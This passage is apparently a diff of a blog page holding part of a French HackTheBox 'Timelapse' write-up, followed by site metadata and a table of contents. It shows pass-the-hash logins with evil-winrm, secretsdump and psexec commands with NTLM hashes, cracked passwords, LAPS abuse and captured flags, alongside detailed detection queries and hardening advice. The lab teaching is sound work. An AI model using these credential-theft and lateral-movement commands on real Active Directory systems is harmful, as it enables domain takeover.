93da975bcea111839cc584f2f528d63e User payl0ad 2601 aad3b435b51404eeaad3b435b51404ee 51bcc0dd5ad8d7d06e6e1438e99a83f8 User svc_deploy 3103 aad3b435b51404eeaad3b435b51404ee c912f3533b7114980dd7b6094be1a9d8 User (LAPS_Readers) TRX 5101 aad3b435b51404eeaad3b435b51404ee 4c7121d35cd421cbbd3e44ce83bc923e User (root flag) 🎓 Note sur Hash LM :\naad3b435b51404eeaad3b435b51404ee Ce hash constant signifie que LM hashing est désactivé (bonne pratique de sécurité).\n🎯 Pass-the-Hash avec TRX 🎓 Technique Pass-the-Hash :\nAu lieu d’utiliser un mot de passe en clair, on peut s’authentifier directement avec le hash NTLM. Cette technique fonctionne car :\nWindows utilise NTLM pour l’authentification réseau Le hash NTLM est la “clé” utilisée pour chiffrer les challenges NTLM Pas besoin de connaître le mot de passe original ! Avantages :\n✅ Pas de cracking nécessaire ✅ Fonctionne même avec mots de passe complexes ✅ Discret (pas de modification de mot de passe) Limitation :\n❌ Ne fonctionne pas avec Kerberos (nécessite le mot de passe ou un ticket) ❌ Détectable (event ID 4624 avec Logon Type 3) Connexion avec Evil-WinRM :\nevil-winrm \\ -i 10.10.11.152 \\ -u TRX \\ -H 4c7121d35cd421cbbd3e44ce83bc923e \\ -S Flags :\nFlag Signification -u Username -H Hash NTLM (au lieu de -p pour password) -S SSL activé ✅ Connexion Réussie !\n*Evil-WinRM* PS C:\\Users\\TRX\\Documents\u003e whoami timelapse\\trx *Evil-WinRM* PS C:\\Users\\TRX\\Documents\u003e whoami /groups | Select-String \"Admin\" # Pas d'admin → Utilisateur standard 🏁 Root Flag *Evil-WinRM* PS C:\\Users\\TRX\\Documents\u003e cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\TRX\\Desktop\u003e dir Directory: C:\\Users\\TRX\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 12/13/2025 6:57 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\TRX\\Desktop\u003e type root.txt 6506078077b79f2969f0a0a69fe4eddf ⭐ ROOT FLAG 9️⃣ DÉTECTION \u0026 MITIGATION 🛡️ Détection SMB Anonymous Access Event IDs Windows :\n# Event ID 4624 - Logon réussi avec Anonymous Logon Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -and $_.Properties[5].Value -eq \"3\" -and # Logon Type = Network $_.Properties[8].Value -match \"ANONYMOUS\" } # Event ID 5140 - Partage réseau accédé Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 5140 -and $_.Message -match \"\\\\\\\\Shares\" } Mitigations :\nDésactiver accès anonyme : # Via GPO : Computer Configuration → Windows Settings → Security Settings # → Local Policies → Security Options # → Network access: Do not allow anonymous enumeration of SAM accounts and shares = Enabled # Via Registre Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" -Name \"RestrictAnonymous\" -Value 1 Désactiver SMBv1 (vulnérable) : Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force Exiger signature SMB : Set-SmbServerConfiguration -RequireSecuritySignature $true -Force Auditer accès aux partages : # Activer l'audit d'accès aux objets auditpol /set /subcategory:\"File Share\" /success:enable /failure:enable 🛡️ Détection Cracking de Fichiers Event IDs :\n# Event ID 4663 - Tentative d'accès à un objet # Surveillance des fichiers .zip, .pfx téléchargés Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4663 -and ($_.Message -match \"\\.zip\" -or $_.Message -match \"\\.pfx\") } Mitigations :\nMots de passe forts (20+ caractères) : # Politique de mot de passe pour archives # Utiliser gestionnaire de mots de passe (KeePass, 1Password, etc.) # Exemple : \"Correct-Horse-Battery-Staple-2025!@#$\" Chiffrement des fichiers sensibles : # Utiliser EFS ou BitLocker cipher /e C:\\SensitiveFiles DLP (Data Loss Prevention) : Bloquer upload de fichiers .pfx/.p12 sur partages Scanner les fichiers pour credentials hardcodés 🛡️ Détection WinRM Certificate Auth Event IDs :\n# Event ID 4624 - Logon via certificat Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -and $_.Properties[10].Value -eq \"3\" -and # Logon Type = Network $_.Message -match \"Certificate\" } # Event ID 4648 - Logon avec credentials explicites Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4648 } # Logs WinRM spécifiques Get-WinEvent -LogName \"Microsoft-Windows-WinRM/Operational\" | Where-Object { $_.Message -match \"Certificate\" } Mitigations :\nRestreindre WinRM : # Limiter les IPs autorisées Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"10.10.10.0/24\" # Désactiver WinRM si non nécessaire Stop-Service WinRM Set-Service WinRM -StartupType Disabled Authentification multi-facteurs (MFA) :\nUtiliser Smart Cards au lieu de certificats simples Implémenter Conditional Access (Azure AD) Certificate Revocation Lists (CRL) :\n# Forcer vérification CRL Set-Item WSMan:\\localhost\\Service\\Auth\\Certificate -Value $true 🛡️ Détection PowerShell History Dumping Event IDs :\n# Event ID 4663 - Accès au fichier ConsoleHost_history.txt Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4663 -and $_.Message -match \"ConsoleHost_history.txt\" } # Script Block Logging (Event ID 4104) Get-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" | Where-Object { $_.Id -eq 4104 -and $_.Message -match \"ConsoleHost_history\" } Mitigations Critiques :\n❌ NE JAMAIS mettre de credentials en clair dans des scripts : # ❌ MAUVAIS $password = \"MyP@ssw0rd123!\" # ✅ BON - Utiliser Get-Credential $creds = Get-Credential # ✅ BON - Utiliser DPAPI pour stockage sécurisé $securePass = Read-Host -AsSecureString \"Enter password\" $encrypted = $securePass | ConvertFrom-SecureString $encrypted | Out-File C:\\secure\\cred.txt # Pour réutiliser $securePass = Get-Content C:\\secure\\cred.txt | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential(\"user\", $securePass) Désactiver ou limiter l’historique : # Désactiver l'historique (pas recommandé pour détection) Set-PSReadlineOption -HistorySaveStyle SaveNothing # Limiter la taille de l'historique Set-PSReadlineOption -MaximumHistoryCount 100 Nettoyage régulier : # Script de nettoyage automatique $historyPath = \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" if (Test-Path $historyPath) { Remove-Item $historyPath -Force } Monitoring PowerShell : # Activer Transcription (enregistre TOUT) $RegPath = \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" New-Item -Path $RegPath -Force Set-ItemProperty -Path $RegPath -Name \"EnableTranscripting\" -Value 1 Set-ItemProperty -Path $RegPath -Name \"OutputDirectory\" -Value \"C:\\PSLogs\" # Activer Script Block Logging $RegPath = \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" New-Item -Path $RegPath -Force Set-ItemProperty -Path $RegPath -Name \"EnableScriptBlockLogging\" -Value 1 🛡️ Détection \u0026 Hardening LAPS Event IDs :\n# Event ID 4662 - Opération effectuée sur un objet AD # Surveillance lecture de ms-Mcs-AdmPwd Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4662 -and $_.Message -match \"ms-Mcs-AdmPwd\" } # Event ID 4624 - Logon avec password LAPS Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -and $_.Properties[5].Value -eq \"Administrator\" } Script de Monitoring LAPS :\n# Surveiller qui lit les passwords LAPS $Events = Get-WinEvent -LogName Security -MaxEvents 1000 | Where-Object { $_.Id -eq 4662 -and $_.Properties[6].Value -match \"ms-Mcs-AdmPwd\" } foreach ($Event in $Events) { [PSCustomObject]@{ Time = $Event.TimeCreated User = $Event.Properties[1].Value Computer = $Event.Properties[8].Value Action = \"LAPS Password Read\" } } Mitigations Critiques :\nRestreindre le groupe LAPS_Readers : # Auditer les membres Get-ADGroupMember \"LAPS_Readers\" | Select-Object Name, SamAccountName # Retirer utilisateurs non autorisés Remove-ADGroupMember -Identity \"LAPS_Readers\" -Members svc_deploy -Confirm:$false Implémenter LAPS avec chiffrement (Windows LAPS) : # Windows LAPS (depuis Windows Server 2025 / Windows 11 22H2) # Chiffre le mot de passe dans AD avec DPAPI Set-LapsADPasswordExpirationTime -Identity \"DC01\" -WhenEffective (Get-Date).AddDays(1) Alertes en temps réel : # Script de détection en temps réel Register-WMIEvent -Query \"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 4662\" -Action { $Event = $EventArgs.NewEvent.TargetInstance if ($Event.Message -match \"ms-Mcs-AdmPwd\") { Send-MailMessage -To \"soc@company.com\" -Subject \"LAPS Password Access\" -Body $Event.Message } } Rotation fréquente : # Forcer rotation immédiate Set-AdmPwdComputerSelfPermission -Identity \"DC01\" Reset-AdmPwdPassword -ComputerName \"DC01\" 🛡️ Détection Pass-the-Hash Event IDs :\n# Event ID 4624 - Logon Type 3 (Network) avec NTLM Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -and $_.Properties[8].Value -eq \"3\" -and # Logon Type = Network $_.Properties[10].Value -eq \"10\" # Authentication Package = NTLM } # Event ID 4625 - Échec de logon (tentatives multiples) Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4625 } Script de Détection Pass-the-Hash :\n# Détecter logons suspects (même hash, IPs différentes) $LogonEvents = Get-WinEvent -LogName Security -MaxEvents 10000 | Where-Object { $_.Id -eq 4624 -and $_.Properties[8].Value -eq \"3\" } $Logons = $LogonEvents | ForEach-Object { [PSCustomObject]@{ Time = $_.TimeCreated User = $_.Properties[5].Value SourceIP = $_.Properties[18].Value LogonType = $_.Properties[8].Value } } # Grouper par utilisateur et détecter anomalies $Logons | Group-Object User | Where-Object { $_.Group.SourceIP | Select-Object -Unique | Measure-Object | Select-Object -ExpandProperty Count -gt 5 } | Select-Object Name, Count Mitigations :\nDésactiver NTLM (si possible) : # Via GPO : Computer Configuration → Windows Settings → Security Settings # → Local Policies → Security Options # → Network security: LAN Manager authentication level = Send NTLMv2 response only. Refuse LM \u0026 NTLM # Via Registre Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" -Name \"LmCompatibilityLevel\" -Value 5 Protected Users Security Group : # Ajouter utilisateurs sensibles (empêche NTLM, DES, RC4) Add-ADGroupMember -Identity \"Protected Users\" -Members Administrator, svc_deploy Credential Guard (Windows 10/11/Server 2016+) : # Activer Credential Guard (protection hardware-based) Enable-WindowsOptionalFeature -FeatureName VirtualMachinePlatform -Online -NoRestart bcdedit /set {default} hypervisorlaunchtype auto 🔟 TIMELINE DÉTAILLÉE Temps Action Résultat T+0 Nmap port scan DC Windows identifié (53, 88, 389, 445, 5986) T+5 Nmap service scan Domain: timelapse.htb, Hostname: DC01 T+10 SMB enumeration (anonymous) Partage “Shares” accessible T+15 SMB navigation Dossiers Dev/ et HelpDesk/ découverts T+18 SMB download winrm_backup.zip téléchargé (2.6 KB) T+20 Tentative extraction ZIP Protégé par mot de passe ❌ T+22 zip2john conversion Hash généré pour John T+25 John cracking (ZIP) supremelegacy (3 secondes) T+27 Extraction ZIP legacyy_dev_auth.pfx obtenu T+30 Tentative extraction PFX Protégé par mot de passe ❌ T+32 pfx2john conversion Erreur asn1crypto ❌ T+35 Installation asn1crypto sudo apt install python3-asn1crypto T+37 pfx2john retry Hash généré pour John T+40 John cracking (PFX) thuglegacy (5 secondes) T+42 OpenSSL extraction clé key.pem généré T+43 OpenSSL extraction cert cert.pem généré T+45 Inspection certificat UPN: legacyy@timelapse.htb découvert T+48 Evil-WinRM connexion (cert) ✅ Accès legacyy T+50 Énumération utilisateur Membre de Remote Management Users T+52 Lecture user flag USER FLAG 🏁 T+55 PowerShell history dump Credentials svc_deploy trouvés ! T+58 Evil-WinRM connexion (svc_deploy) ✅ Accès svc_deploy T+60 Énumération groupes Membre de LAPS_Readers découvert T+62 Get-ADComputer enumeration DC01 identifié T+65 LAPS password dump Password Administrator récupéré T+68 Evil-WinRM connexion (Administrator) ✅ Accès Administrator T+70 Recherche root flag Trouvé dans C:\\Users\\TRX\\Desktop\\ T+72 Tentative lecture directe Access Denied ❌ T+75 impacket-secretsdump Tous les hashes NTLM dumpés T+78 Identification hash TRX 4c7121d35cd421cbbd3e44ce83bc923e T+80 Evil-WinRM Pass-the-Hash (TRX) ✅ Accès TRX T+82 Lecture root flag ROOT FLAG 🏁 Temps total : ~82 minutes\n1️⃣1️⃣ OUTILS UTILISÉS Outil Version Usage Commande Clé Nmap 7.94SVN Port scanning, service detection nmap -p- -sCV 10.10.11.152 smbclient 4.17.12 Énumération SMB, download fichiers smbclient -L //10.10.11.152 -N John the Ripper 1.9.0-jumbo Cracking ZIP/PFX john hash.john --wordlist=rockyou.txt OpenSSL 3.0.11 Extraction certificat/clé privée openssl pkcs12 -in file.pfx -out cert.pem Evil-WinRM 3.5 Connexion WinRM, exploitation evil-winrm -i IP -c cert.pem -k key.pem -S impacket-secretsdump 0.11.0 Dump secrets AD (NTDS.dit) impacket-secretsdump user:pass@IP PowerShell 5.1 Énumération AD, LAPS Get-ADComputer -Properties ms-Mcs-AdmPwd 1️⃣2️⃣ LEÇONS APPRISES ✅ Bonnes Pratiques Offensives Toujours vérifier SMB Anonymous :\nPremière chose à tester sur un DC Windows Souvent mal configuré en environnement dev/test Cracking progressif :\nZIP → PFX → Certificat (chaque couche révèle la suivante) Utiliser rockyou.txt en premier (rapide, souvent suffisant) PowerShell History = Goldmine :\nChemin: $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Contient souvent des credentials en clair LAPS Abuse :\nSi membre de LAPS_Readers → Admin local garanti Vérifier attribut ms-Mcs-AdmPwd sur tous les computers Pass-the-Hash \u003e Cracking :\nPas besoin de craquer les hashes Fonctionne même avec mots de passe très complexes ❌ Vulnérabilités Critiques Identifiées Vulnérabilité Impact Recommandation SMB Anonymous Access Exposition de fichiers sensibles Désactiver null sessions, restreindre partages Mots de passe faibles (ZIP/PFX) Cracking en secondes Utiliser 20+ caractères, gestionnaire MDP Credentials en clair (PS History) Compromission instantanée Utiliser Get-Credential, jamais hardcoder LAPS_Readers trop permissif Accès admin local sur toutes machines Limiter strictement les membres ACLs permissives Accès non autorisé aux fichiers Auditer régulièrement les permissions NTFS NTLM activé Pass-the-Hash possible Migrer vers Kerberos-only, Protected Users 🛡️ Recommandations Défensives Prioritaires Criticité HAUTE (à implémenter immédiatement) :\n✅ Désactiver accès SMB anonyme ✅ Activer PowerShell Transcription + Script Block Logging ✅ Restreindre groupe LAPS_Readers (seulement Tier 0 admins) ✅ Implémenter alertes sur lecture ms-Mcs-AdmPwd Criticité MOYENNE (à planifier) :\n✅ Désactiver SMBv1 ✅ Forcer signature SMB ✅ Rotation LAPS plus fréquente (7 jours au lieu de 30) ✅ Utiliser Protected Users pour comptes sensibles Criticité BASSE (nice-to-have) :\n✅ Migrer vers Windows LAPS (chiffrement password) ✅ Credential Guard sur toutes les machines ✅ MFA pour WinRM ✅ Certificate Revocation Lists (CRL) 📚 RESSOURCES Documentation Officielle Microsoft LAPS Documentation WinRM Configuration PowerShell Logging Active Directory Security Best Practices Outils et Frameworks Evil-WinRM GitHub Impacket Suite John the Ripper LAPS Toolkit Articles et Recherches HackTricks - LAPS PayloadsAllTheThings - Windows PrivEsc ADSecurity - PowerShell History SpecterOps - Pass-the-Hash 📊 SCHÉMA D’EXPLOITATION ┌─────────────────────────────────────────────────────────────┐ │ CHAÎNE D'ATTAQUE TIMELAPSE │ └─────────────────────────────────────────────────────────────┘ [1] ACCÈS INITIAL SMB Anonymous (445) ↓ Shares\\Dev\\winrm_backup.zip ↓ [zip2john + john] Password: supremelegacy ↓ legacyy_dev_auth.pfx ↓ [pfx2john + john] Password: thuglegacy ↓ Certificate + Private Key ↓ ┌──────────────────────────┐ │ WinRM Certificate Auth │ │ Port 5986 (HTTPS) │ │ User: legacyy │ └──────────────────────────┘ [2] ÉLÉVATION DE PRIVILÈGES PowerShell History ($env:APPDATA\\...\\ConsoleHost_history.txt) ↓ Credentials en clair: svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV ↓ ┌──────────────────────────┐ │ WinRM Password Auth │ │ User: svc_deploy │ │ Group: LAPS_Readers │ └──────────────────────────┘ [3] ABUS LAPS Get-ADComputer -Properties ms-Mcs-AdmPwd ↓ Password Administrator: I)}73pmp{9+;E2/kWv0LZ7Tt ↓ ┌──────────────────────────┐ │ WinRM Admin Auth │ │ User: Administrator │ │ (Compte local DC01) │ └──────────────────────────┘ [4] POST-EXPLOITATION impacket-secretsdump ↓ NTDS.dit dump: - Administrator: 22d04d77cc32a59f9fe6701aa9ffafb0 - krbtgt: 2960d580f05cd511b3da3d3663f3cb37 - TRX: 4c7121d35cd421cbbd3e44ce83bc923e ⭐ ↓ Pass-the-Hash (TRX) ↓ ┌──────────────────────────┐ │ Evil-WinRM PTH │ │ User: TRX │ │ Hash: 4c7121d3... │ └──────────────────────────┘ ↓ 🏁 ROOT FLAG (C:\\Users\\TRX\\Desktop\\root.txt) 🏁 FLAGS User Flag : c5f8ed1478d7f0a3d0ac7403e16b5854\nLocation: C:\\Users\\legacyy\\Desktop\\user.txt\nRoot Flag : 6506078077b79f2969f0a0a69fe4eddf\nLocation: C:\\Users\\TRX\\Desktop\\root.txt\n📝 NOTES FINALES Pourquoi le root flag est chez TRX et pas Administrator ?\nCette configuration est intentionnelle par HTB pour enseigner :\nLes ACLs Windows ≠ Permissions AD\nMême Domain Admin peut être bloqué par NTFS ACLs Post-exploitation complète nécessaire\nPas seulement “devenir admin” → explorer tous les utilisateurs Pass-the-Hash = Technique essentielle\nMouvement latéral sans mot de passe Ce qu’on aurait pu faire autrement :\nModifier les ACLs (mais destructif) : takeown /f C:\\Users\\TRX\\Desktop\\root.txt icacls C:\\Users\\TRX\\Desktop\\root.txt /grant Administrator:F Utiliser PsExec avec hash Administrator : impacket-psexec -hashes :22d04d77cc32a59f9fe6701aa9ffafb0 Administrator@10.10.11.152 DCSync Attack (extraire tous les hashes via Kerberos) : impacket-secretsdump -just-dc-ntlm timelapse.htb/Administrator@10.10.11.152 -hashes :22d04d77cc32a59f9fe6701aa9ffafb0 📅 Terminé le : 13/12/2025\n⏱️ Durée : ~82 minutes\n✅ Statut : Pwned\n🎓 Difficulté : Easy (mais pédagogique !)\nCe write-up a été réalisé dans un cadre éducatif légal sur HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés avec permission explicite.\n",
+  "wordCount" : "5192",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/timelapse/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Timelapse - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;25 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#-r%c3%a9sum%c3%a9-ex%c3%a9cutif" aria-label="📋 Résumé Exécutif">📋 Résumé Exécutif</a><ul>
+                        
+                <li>
+                    <a href="#-cha%c3%aene-dattaque-compl%c3%a8te" aria-label="🔗 Chaîne d&rsquo;Attaque Complète">🔗 Chaîne d&rsquo;Attaque Complète</a></li></ul>
+                </li>
+                <li>
+                    <a href="#1-reconnaissance" aria-label="1️⃣ RECONNAISSANCE">1️⃣ RECONNAISSANCE</a><ul>
+                        
+                <li>
+                    <a href="#-scan-nmap" aria-label="🔍 Scan Nmap">🔍 Scan Nmap</a></li>
+                <li>
+                    <a href="#-configuration-etchosts" aria-label="📝 Configuration /etc/hosts">📝 Configuration /etc/hosts</a></li></ul>
+                </li>
+                <li>
+                    <a href="#2-%c3%a9num%c3%a9ration-smb" aria-label="2️⃣ ÉNUMÉRATION SMB">2️⃣ ÉNUMÉRATION SMB</a><ul>
+                        
+                <li>
+                    <a href="#-quest-ce-que-smb-" aria-label="🎓 Qu&rsquo;est-ce que SMB ?">🎓 Qu&rsquo;est-ce que SMB ?</a></li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-des-partages" aria-label="🔎 Énumération des Partages">🔎 Énumération des Partages</a></li>
+                <li>
+                    <a href="#-exploration-du-partage-shares" aria-label="📁 Exploration du Partage &ldquo;Shares&rdquo;">📁 Exploration du Partage &ldquo;Shares&rdquo;</a></li></ul>
+                </li>
+                <li>
+                    <a href="#3-cracking---zip-et-pfx" aria-label="3️⃣ CRACKING - ZIP ET PFX">3️⃣ CRACKING - ZIP ET PFX</a><ul>
+                        
+                <li>
+                    <a href="#-%c3%a9tape-1--cracking-du-zip" aria-label="🔓 Étape 1 : Cracking du ZIP">🔓 Étape 1 : Cracking du ZIP</a></li>
+                <li>
+                    <a href="#-%c3%a9tape-2--analyse-du-fichier-pfx" aria-label="📜 Étape 2 : Analyse du Fichier PFX">📜 Étape 2 : Analyse du Fichier PFX</a></li>
+                <li>
+                    <a href="#-%c3%a9tape-3--cracking-du-pfx" aria-label="🔓 Étape 3 : Cracking du PFX">🔓 Étape 3 : Cracking du PFX</a></li>
+                <li>
+                    <a href="#-%c3%a9tape-4--extraction-certificat-et-cl%c3%a9-priv%c3%a9e" aria-label="🔐 Étape 4 : Extraction Certificat et Clé Privée">🔐 Étape 4 : Extraction Certificat et Clé Privée</a></li></ul>
+                </li>
+                <li>
+                    <a href="#4-acc%c3%a8s-initial---winrm-certificate-auth" aria-label="4️⃣ ACCÈS INITIAL - WINRM CERTIFICATE AUTH">4️⃣ ACCÈS INITIAL - WINRM CERTIFICATE AUTH</a><ul>
+                        
+                <li>
+                    <a href="#-quest-ce-que-winrm-" aria-label="🎓 Qu&rsquo;est-ce que WinRM ?">🎓 Qu&rsquo;est-ce que WinRM ?</a></li>
+                <li>
+                    <a href="#-m%c3%a9thodes-dauthentification-winrm" aria-label="🔐 Méthodes d&rsquo;Authentification WinRM">🔐 Méthodes d&rsquo;Authentification WinRM</a></li>
+                <li>
+                    <a href="#-connexion-winrm-avec-evil-winrm" aria-label="🚪 Connexion WinRM avec Evil-WinRM">🚪 Connexion WinRM avec Evil-WinRM</a></li>
+                <li>
+                    <a href="#-user-flag" aria-label="🏁 User Flag">🏁 User Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#5-%c3%a9l%c3%a9vation---svc_deploy" aria-label="5️⃣ ÉLÉVATION - SVC_DEPLOY">5️⃣ ÉLÉVATION - SVC_DEPLOY</a><ul>
+                        
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-post-exploitation" aria-label="🔍 Énumération Post-Exploitation">🔍 Énumération Post-Exploitation</a></li>
+                <li>
+                    <a href="#-powershell-history---goldmine-de-credentials" aria-label="🎯 PowerShell History - Goldmine de Credentials">🎯 PowerShell History - Goldmine de Credentials</a></li>
+                <li>
+                    <a href="#-analyse-technique-du-script-powershell" aria-label="🎓 Analyse Technique du Script PowerShell">🎓 Analyse Technique du Script PowerShell</a></li>
+                <li>
+                    <a href="#-connexion-en-tant-que-svc_deploy" aria-label="🔄 Connexion en tant que svc_deploy">🔄 Connexion en tant que svc_deploy</a></li></ul>
+                </li>
+                <li>
+                    <a href="#6-exploitation-laps" aria-label="6️⃣ EXPLOITATION LAPS">6️⃣ EXPLOITATION LAPS</a><ul>
+                        
+                <li>
+                    <a href="#-quest-ce-que-laps-" aria-label="🎓 Qu&rsquo;est-ce que LAPS ?">🎓 Qu&rsquo;est-ce que LAPS ?</a></li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-laps" aria-label="🔍 Énumération LAPS">🔍 Énumération LAPS</a></li>
+                <li>
+                    <a href="#-r%c3%a9cup%c3%a9ration-du-laps-password" aria-label="🔑 Récupération du LAPS Password">🔑 Récupération du LAPS Password</a></li></ul>
+                </li>
+                <li>
+                    <a href="#7-acc%c3%a8s-root" aria-label="7️⃣ ACCÈS ROOT">7️⃣ ACCÈS ROOT</a><ul>
+                        
+                <li>
+                    <a href="#-connexion-en-tant-quadministrator" aria-label="🚪 Connexion en tant qu&rsquo;Administrator">🚪 Connexion en tant qu&rsquo;Administrator</a></li>
+                <li>
+                    <a href="#-recherche-du-root-flag" aria-label="🔍 Recherche du Root Flag">🔍 Recherche du Root Flag</a></li>
+                <li>
+                    <a href="#-probl%c3%a8me-dacc%c3%a8s" aria-label="❌ Problème d&rsquo;Accès">❌ Problème d&rsquo;Accès</a></li></ul>
+                </li>
+                <li>
+                    <a href="#8-post-exploitation---secretsdump" aria-label="8️⃣ POST-EXPLOITATION - SECRETSDUMP">8️⃣ POST-EXPLOITATION - SECRETSDUMP</a><ul>
+                        
+                <li>
+                    <a href="#-quest-ce-que-secretsdump-" aria-label="🎓 Qu&rsquo;est-ce que secretsdump ?">🎓 Qu&rsquo;est-ce que secretsdump ?</a></li>
+                <li>
+                    <a href="#-dump-des-secrets" aria-label="💾 Dump des Secrets">💾 Dump des Secrets</a></li>
+                <li>
+                    <a href="#-tableau-r%c3%a9capitulatif-des-hashes" aria-label="📊 Tableau Récapitulatif des Hashes">📊 Tableau Récapitulatif des Hashes</a></li>
+                <li>
+                    <a href="#-pass-the-hash-avec-trx" aria-label="🎯 Pass-the-Hash avec TRX">🎯 Pass-the-Hash avec TRX</a></li>
+                <li>
+                    <a href="#-root-flag" aria-label="🏁 Root Flag">🏁 Root Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#9-d%c3%a9tection--mitigation" aria-label="9️⃣ DÉTECTION &amp; MITIGATION">9️⃣ DÉTECTION &amp; MITIGATION</a><ul>
+                        
+                <li>
+                    <a href="#-d%c3%a9tection-smb-anonymous-access" aria-label="🛡️ Détection SMB Anonymous Access">🛡️ Détection SMB Anonymous Access</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection-cracking-de-fichiers" aria-label="🛡️ Détection Cracking de Fichiers">🛡️ Détection Cracking de Fichiers</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection-winrm-certificate-auth" aria-label="🛡️ Détection WinRM Certificate Auth">🛡️ Détection WinRM Certificate Auth</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection-powershell-history-dumping" aria-label="🛡️ Détection PowerShell History Dumping">🛡️ Détection PowerShell History Dumping</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection--hardening-laps" aria-label="🛡️ Détection &amp; Hardening LAPS">🛡️ Détection &amp; Hardening LAPS</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection-pass-the-hash" aria-label="🛡️ Détection Pass-the-Hash">🛡️ Détection Pass-the-Hash</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-timeline-d%c3%a9taill%c3%a9e" aria-label="🔟 TIMELINE DÉTAILLÉE">🔟 TIMELINE DÉTAILLÉE</a></li>
+                <li>
